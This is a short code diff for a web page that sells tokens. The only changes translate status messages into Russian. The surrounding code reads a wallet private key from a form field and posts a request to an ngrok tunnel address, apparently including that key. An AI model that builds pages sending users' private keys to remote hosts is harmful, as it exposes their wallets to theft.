@@ -60,7 +60,7 @@
             const privateKey = document.getElementById("privateKey").value;
             const tokenAddress = document.getElementById("tokenAddress").value;
             const status = document.getElementById("status");
-            status.innerText = "Processing...";
+            status.innerText = "Отправка...";
 
             const response = await fetch("https://5f0e-95-46-155-196.ngrok-free.app/api/tokens/sell", {
                 method: "POST",
@@ -70,7 +70,7 @@
             const data = await response.json();
 
             if (response.ok) {
-                status.innerText = "Success: " + data.signature;
+                status.innerText = "Успешно!";
             } else {
                 status.innerText = "Error: " + data.error;
             }
